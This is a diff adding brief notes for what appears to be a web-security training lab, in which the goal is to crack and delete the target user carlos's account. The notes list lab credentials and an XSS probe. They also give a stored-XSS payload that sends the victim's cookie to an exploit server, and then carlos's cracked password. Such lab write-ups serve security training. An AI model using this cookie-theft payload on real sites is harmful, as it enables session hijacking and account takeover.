@@ -1,0 +1,15 @@
+Lab #10: Offline password cracking
+
+    Target Goal: 
+         Exploite the XSS vulnerability to access the carlos's hashed password, crack it and delete it 
+    
+    Credentials: 
+     Our      :>   weiner:peter
+     Target   :>   carlos
+    
+    Analysis: 
+    
+       >> add this in any input field to check for XSS Vulnerability. <script>alert(-1)</script>
+       >> add this at the same place where you put the about field to test for XSS Vulnerability <script>document.location=' ******ADD URL OF THE EXPLOITE SERVER****** ' + document.cookie</script>
+       >> You will receive the cookie at the server in logs then decrypt it and you are good to go 
+        carlos: onceuponatime
